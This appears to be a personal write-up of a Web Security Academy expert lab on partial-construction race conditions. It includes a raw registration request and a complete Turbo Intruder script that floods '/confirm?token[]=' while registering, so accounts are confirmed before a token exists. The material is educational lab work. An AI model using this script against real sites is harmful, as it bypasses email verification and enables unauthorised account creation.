# EXPERT: Partial construction race conditions

![Снимок экрана 2025-12-03 в 22.18.01.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.18.01.png)

![Снимок экрана 2025-12-03 в 22.16.51.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.16.51.png)

This leaks the fact that the final registration confirmation is submitted via a `POST` request to `/confirm`, with the token provided in the query string.

Ivestigating:

![Снимок экрана 2025-12-03 в 22.18.57.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.18.57.png)

Forbidden may point to a fact that devs have patched the vulnerability when the token supplied was null:

![Снимок экрана 2025-12-03 в 22.20.17.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.20.17.png)

![Снимок экрана 2025-12-03 в 22.48.06.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.48.06.png)

If we try to pass token as an array, which could potentially match an uninitialized registration token:

![Снимок экрана 2025-12-03 в 22.21.16.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.21.16.png)

If tried to register the same username twice:

![Снимок экрана 2025-12-03 в 22.24.03.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.24.03.png)

If we send 2 requests in parallel, we can see that the confirmation response comes much quicker:

![Снимок экрана 2025-12-03 в 22.29.20.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.29.20.png)

![Снимок экрана 2025-12-03 в 22.29.31.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.29.31.png)

Launch TurboIntruder to prove the concept:

![Снимок экрана 2025-12-03 в 22.42.52.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_22.42.52.png)

```python
POST /register HTTP/2
Host: 0a8a0090040dc361824d49f100d20075.web-security-academy.net
Cookie: phpsessionid=RgvDSuhiDe2XV80unFpKMmSzmR2SMe5p
Content-Length: 103
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0a8a0090040dc361824d49f100d20075.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8a0090040dc361824d49f100d20075.web-security-academy.net/register
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=ZTPNbjiDWnlgEzVkK7ikGTiFhlVsu6mE&username=racer23%s&email=racingo@ginandjuice.shop&password=pass
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    # replace your `phpsessionid` session cookie in here
    confirmTokenRequest = '''POST /confirm?token[]= HTTP/2
Host: 0a8a0090040dc361824d49f100d20075.web-security-academy.net
Cookie: phpsessionid=RgvDSuhiDe2XV80unFpKMmSzmR2SMe5p
Content-Length: 0

'''
    MIN_ATTEMPT = 1
    MAX_ATTEMPT = 20
    for usernamePrefix in range(MIN_ATTEMPT, MAX_ATTEMPT):
        currentQueue = 'queue' + str(usernamePrefix)
        # prepare 1 registration request
        engine.queue(target.req, str(usernamePrefix), gate=currentQueue)

        # prepare x number of confirm token requests
        CONFIRM_REQUEST_NUMBER = 50
        for confirmRequest in range(CONFIRM_REQUEST_NUMBER):
            engine.queue(confirmTokenRequest, gate=currentQueue)

        # send all prepared requests at the same time
        engine.openGate(currentQueue)

def handleResponse(req, interesting):
    table.add(req)
```

![Снимок экрана 2025-12-03 в 23.10.34.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_23.10.34.png)

![Снимок экрана 2025-12-03 в 23.15.54.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_23.15.54.png)

![Снимок экрана 2025-12-03 в 23.17.26.png](EXPERT%20Partial%20construction%20race%20conditions/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_23.17.26.png)